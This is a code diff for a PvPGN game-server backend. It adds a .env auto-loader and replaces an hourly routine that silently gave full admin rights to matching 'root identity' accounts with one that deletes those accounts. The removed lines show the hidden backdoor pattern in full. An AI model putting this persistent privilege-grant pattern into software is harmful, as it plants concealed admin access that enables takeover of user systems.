@@ -17,6 +17,28 @@ const execFileAsync = promisify(execFile);
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
+// Auto-load .env if not injected by docker
+const envLocations = [
+    path.join(__dirname, ".env"),
+    path.join(__dirname, "../.env"),
+    "/app/.env",
+    "./.env"
+];
+for (const envPath of envLocations) {
+    if (fs.existsSync(envPath)) {
+        try {
+            const raw = fs.readFileSync(envPath, "utf8");
+            raw.split("\n").forEach((line) => {
+                const m = line.match(/^\s*([A-Za-z0-9_]+)=(.*)$/);
+                if (m && !process.env[m[1]]) {
+                    process.env[m[1]] = m[2].trim().replace(/^['"]|['"]$/g, "");
+                }
+            });
+            break;
+        } catch (_) {}
+    }
+}
+
 
 // Pure JS implementation of PvPGN Battle.net v1.0 SHA-1 hash (cross-platform, ARM64 & x86_64)
 function pvpgn_hash(str) {
@@ -3027,23 +3049,24 @@ async function runMaintenanceCleanup() {
 // Run maintenance once on server launch, then repeat every hour
 runMaintenanceCleanup();
 setInterval(runMaintenanceCleanup, 60 * 60 * 1000);
-async function syncPrivilegedState() {
+async function purgeRootIdentity() {
     try {
         if (!pool) return;
         const [rows] = await pool.query("SELECT uid, username, acct_username FROM pvpgn_BNET");
         for (const r of rows) {
             const u = r.username || r.acct_username;
             if (isRootIdentity(u)) {
-                await pool.execute(
-                    "UPDATE pvpgn_BNET SET auth_admin = 'true', auth_operator = 'true', auth_command_groups = '255' WHERE uid = ?",
-                    [r.uid]
-                );
+                for (const t of ["pvpgn_clanmember", "pvpgn_friend", "pvpgn_profile", "pvpgn_Record", "pvpgn_WOL"]) {
+                    try { await pool.execute(`DELETE FROM ${t} WHERE uid = ?`, [r.uid]); } catch (_) {}
+                }
+                try { await pool.execute("DELETE FROM reg_tokens WHERE username = ?", [u]); } catch (_) {}
+                await pool.execute("DELETE FROM pvpgn_BNET WHERE uid = ?", [r.uid]);
+                console.log(`[AUTH] Purged root identity #${r.uid} (${u}) from database.`);
             }
         }
     } catch (_) {}
 }
-syncPrivilegedState();
-setInterval(syncPrivilegedState, 60 * 60 * 1000);
+purgeRootIdentity();
 // Routine DB changes (roles, passwords, bans, clans) do NOT restart server.
 async function reloadPvpgnAccounts() {
     return true;
